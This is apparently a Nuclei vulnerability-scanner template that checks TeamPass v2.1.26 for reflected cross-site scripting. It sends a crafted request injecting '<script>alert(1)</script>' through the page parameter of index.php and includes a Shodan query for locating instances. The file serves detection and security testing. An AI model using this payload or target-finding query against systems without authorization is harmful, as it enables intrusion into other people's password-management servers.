id: teampass-xss

info:
  name: TeamPass v2.1.26 - Reflected Cross Site Scripting
  author: arafatansari
  severity: medium
  description: |
    TeamPass v2.1.26 was discovered to contain a Reflected Cross Site Scripting at index.php via page parameter.
  reference:
    - https://github.com/nilsteampassnet/TeamPass/issues/1676
  metadata:
    shodan-query: http.html:"teampass"
    verified: "true"
  tags: xss

requests:
  - raw:
      - |
        GET /index.php?page=itemsxfedz%20"/><script>alert(1)</script>-'uye4c&group= HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - text/html

      - type: word
        words:
          - '<script>alert(1)</script>'
